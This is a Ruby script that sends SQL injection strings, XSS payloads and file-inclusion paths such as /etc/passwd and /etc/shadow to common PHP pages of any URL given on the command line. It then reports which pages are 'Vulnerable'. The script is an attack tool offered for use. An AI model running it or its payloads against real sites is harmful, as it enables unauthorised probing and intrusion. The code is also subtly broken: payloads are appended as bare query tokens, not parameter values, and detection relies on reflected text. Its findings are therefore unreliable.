require 'net/http'
require 'uri'
require 'optparse'

def send_request(uri, payload)
  http = Net::HTTP.new(uri.host, uri.port)
  http.use_ssl = (uri.scheme == 'https') # Enable SSL/TLS for HTTPS URLs
  request = Net::HTTP::Get.new(uri)
  http.request(request)
rescue Net::OpenTimeout, Net::ReadTimeout
  "Timeout occurred while scanning"
rescue SocketError
  "Network error occurred while scanning"
end

def scan_url(url, payload)
  uri = URI(url)
  query_delimiter = uri.query ? '&' : ''
  uri.query = [uri.query, URI.encode_www_form_component(payload)].compact.join(query_delimiter)

  response = send_request(uri, payload)
  if response.is_a?(String)
    response
  else
    response.body.include?(payload) ? "Vulnerable" : "Not Vulnerable"
  end
end

def scan_sql_injection(url)
  payloads = [
    "' OR 1=1--", "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1#", "' OR '1'='1'#",
    "') OR 1=1--", "') OR ('1'='1", "') OR ('1'='1'--", "') OR 1=1#", "') OR ('1'='1'#",
    "')) OR 1=1--", "')) OR (('1'='1", "')) OR (('1'='1'--", "')) OR 1=1#", "')) OR (('1'='1'#"
  ]
  payloads.each do |payload|
    result = scan_url(url, payload)
    puts "SQL Injection (#{payload}): #{result}"
  end
end

def scan_xss(url)
  payloads = [
    "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>", "<body onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\">", "<a href=\"javascript:alert('XSS')\">Click me</a>"
  ]
  payloads.each do |payload|
    result = scan_url(url, payload)
    puts "XSS (#{payload}): #{result}"
  end
end

def scan_file_inclusion(url)
  payloads = ["/etc/passwd", "/etc/shadow", "C:\\Windows\\System32\\drivers\\etc\\hosts"]
  payloads.each do |payload|
    result = scan_url(url, payload)
    puts "File Inclusion (#{payload}): #{result}"
  end
end

def scan_common_pages(base_url)
  common_pages = [
    "", "/index.php", "/login.php", "/register.php", "/search.php", "/contact.php",
    "/products.php", "/category.php", "/view.php", "/user.php", "/admin.php"
  # add more pages as needed
  ]
  common_pages.each do |page|
    url = base_url + page
    puts "Scanning URL: #{url}"
    scan_sql_injection(url + "?id=1")
    scan_xss(url + "?search=test")
    scan_file_inclusion(url + "?file=test")
    puts "------------------------"
  end
end

def main
  options = {}

  OptionParser.new do |opts|
    opts.banner = "Usage: ruby scanner.rb [options]"

    opts.on("-u", "--url URL", "Base URL to scan") do |url|
      options[:url] = url
    end
  end.parse!

  if options[:url]
    puts "Scanning for vulnerabilities..."
    scan_common_pages(options[:url])
  else
    puts "Please provide a base URL to scan using the -u or --url option"
  end
end

main
